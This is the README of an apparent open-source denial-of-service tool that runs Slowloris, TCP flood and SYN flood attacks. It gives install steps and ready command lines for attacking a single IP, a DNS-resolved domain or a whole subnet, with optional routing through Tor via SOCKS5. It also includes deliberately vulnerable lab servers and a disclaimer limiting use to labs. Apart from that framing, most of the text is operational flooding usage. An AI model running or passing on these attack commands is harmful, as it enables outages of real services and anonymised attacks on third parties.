# DoS tools

Unified tool for testing **Slowloris**, **TCP Flood** and **SYN Flood** attacks in a controlled lab environment.

⚠️ **Disclaimer**: Use only in environments you fully control (labs, VMs). Attacks like these are illegal against third-party systems and can cause damage. This project is for educational and research purposes only.

---

## Modes Available

* **sniper** → attack targeting a single IP
* **domain** → attack targeting a domain (resolved via DNS)
* **pitchfork** → test across a subnet + multiple ports of your choice
* **tcpflood** → opens and maintains many TCP connections, sending payloads periodically
* **synflood** → sends raw SYN packets at configurable rates (requires root and scapy)

---

## Installation

```bash
git clone https://github.com/CLSxSH7/slowloris-tool.git
cd slowloris-tool
pip install -r requirements.txt
```

For SOCKS5 proxy support, also install:

```bash
pip install PySocks
```

For SYN flood support (Linux/WSL attacker):

```bash
pip install scapy
sudo apt install tcpdump
```

---

## Usage

### Interactive menu

If you run without parameters:

```bash
python slowloris-tool.py
```

You will see a menu to choose between modes, with prompts for each parameter.

---

### Sniper mode (single IP)

```bash
python slowloris-tool.py sniper 192.168.0.10 -p 80 -s 200 --https -ua --sleeptime 10
```

With SOCKS5 proxy (e.g., Tor):

```bash
python slowloris-tool.py sniper 192.168.0.10 -p 80 --socks5 127.0.0.1:9050
```

---

### Domain mode

```bash
python slowloris-tool.py domain example.com -p 443 --https -s 200 -ua
```

With SOCKS5 proxy:

```bash
python slowloris-tool.py domain example.com -p 443 --https --socks5 127.0.0.1:9050
```

---

### Pitchfork mode (Subnet/Ports)

```bash
python slowloris-tool.py pitchfork 192.168.0.0/24 -P 80,8080,443 -s 200 -t 50 -d 120
```

> ⚠️ In this mode, SOCKS5 proxy is not supported (direct execution only).

---

### TCP Flood mode (interactive)

Prompts and meaning:

```
Target host: 127.0.0.1
Port [80]: 
Initial sockets [10]:                   # number of initial TCP connections
Add sockets per step [10]:              # how many new connections per step
Max sockets [200]:                      # max simultaneous connections
Seconds per step [10]:                  # duration of each ramp step
Payload bytes per send [256]:           # bytes sent per socket
Send interval per socket (s) [1.0]:     # interval between sends
Latency threshold to stop (s) [1.0]:    # monitor stop condition
Duration: blank = run until Ctrl+C
```

Example one-liner:

```bash
python -m slowloris_tool.cli tcpflood 127.0.0.1 -p 8080 --start 5 --step 5 --max 50 --step-duration 6 --payload-size 256 --send-interval 0.5 --impact-latency 1.0
```

---

### SYN Flood mode (interactive)

Prompts and meaning:

```
Target host: 127.0.0.1
Port [80]: 
Initial pps [50]:               # starting packets per second
Increase pps per step [50]:     # increase per step
Max pps [1000]:                 # max packets per second
Seconds per step [10]:          # duration of each ramp step
Latency threshold to stop (s) [1.0]: 
Duration: blank = run until Ctrl+C
```

Example one-liner (Linux/WSL attacker, needs sudo):

```bash
sudo PYTHONPATH="$(pwd)/src" venv/bin/python -m slowloris_tool.cli synflood <IP> -p 8080 --start 200 --step 200 --max 1200 --step-duration 6
```

---

## Vulnerable servers for testing

### Slowloris test server

A simple server vulnerable to **Slowloris** (headers read slowly).

```bash
python vulnerable_server.py --host 0.0.0.0 --port 8080 --max-workers 5
```

### TCP/SYN flood test server

Variant server that holds open connections to demonstrate **TCP flood** and **SYN flood**.

```bash
python vulnerable_server_tcp_syn.py --host 0.0.0.0 --port 8080 --max-workers 5
```

---

## Expected behaviors of vulnerable servers

* **Slowloris**: many sockets remain waiting for headers, consuming workers → new clients blocked.
* **TCP flood**: many `ESTABLISHED` connections from attacker → server threads/resources exhausted.
* **SYN flood**: many SYN packets in backlog, new connections delayed or dropped; `curl` fails with timeout or invalid protocol.

---

## Step-by-step: running TCP flood in local lab

1. Start vulnerable server:

   ```powershell
   python vulnerable_server_tcp_syn.py --host 0.0.0.0 --port 8080 --max-workers 5
   ```

2. On attacker (WSL/Linux):

   ```bash
   python -m slowloris_tool.cli tcpflood <IP> -p 8080 --start 10 --step 10 --max 200 --step-duration 6 --payload-size 256 --send-interval 0.5
   ```

3. Monitor:

   * Windows: `netstat -ano | findstr :8080` or `(Get-NetTCPConnection -LocalPort 8080).Count`
   * WSL: `tcpdump` to confirm traffic.

4. Test service: `curl -m 5 -v http://<IP>:8080/`

---

## Step-by-step: running SYN flood in local lab

1. Start vulnerable server:

   ```powershell
   python vulnerable_server.py --host 0.0.0.0 --port 8080 --max-workers 5
   ```

2. On attacker (WSL, root):

   ```bash
   sudo PYTHONPATH="$(pwd)/src" venv/bin/python -m slowloris_tool.cli synflood <IP> -p 8080 --start 200 --step 200 --max 1200 --step-duration 6
   ```

3. Monitor:

   * WSL: `tcpdump -n -i any 'tcp[tcpflags] & (tcp-syn) != 0 and dst host <IP> and dst port 8080'`
   * Windows: `curl -m 5 -v http://<IP>:8080/` may timeout or fail.

---

## Dependencies

* Python 3.9+
* `requests`
* `PySocks` (optional, SOCKS5)
* `scapy` (for SYN flood)

---

## Notes

* `--socks5` supported only in **sniper** and **domain**.
* TCP/SYN flood modes require local lab vulnerable servers to demonstrate impact.
* Always stop attacks with **Ctrl+C**. Do not run against production systems.
